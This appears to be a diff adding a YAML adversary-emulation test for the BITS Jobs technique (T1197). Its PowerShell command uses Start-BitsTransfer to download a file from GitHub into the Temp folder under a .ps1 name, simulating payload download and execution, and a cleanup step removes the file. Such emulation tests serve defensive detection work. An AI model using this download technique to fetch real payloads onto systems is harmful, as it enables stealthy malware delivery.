@@ -1,0 +1,19 @@
+- id: bb8a6ec4-3992-50c5-b9a3-ffa48783b78a
+  name: Soumaia ART Tests - Bitsadmin Download (PowerShell)
+  description: 'This test simulates an adversary leveraging bitsadmin.exe to download
+
+    and execute a payload leveraging PowerShell
+
+
+    Upon execution you will find a github markdown file downloaded to the Temp directory'
+  tactic: stealth
+  technique:
+    attack_id: T1197
+    name: BITS Jobs
+  platforms:
+    windows:
+      psh:
+        command: |-
+          Start-BitsTransfer -Priority foreground -Source https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md -Destination $env:TEMP\bitsadmin2_flag.ps1
+        cleanup: |-
+          Remove-Item $env:TEMP\bitsadmin2_flag.ps1 -ErrorAction Ignore
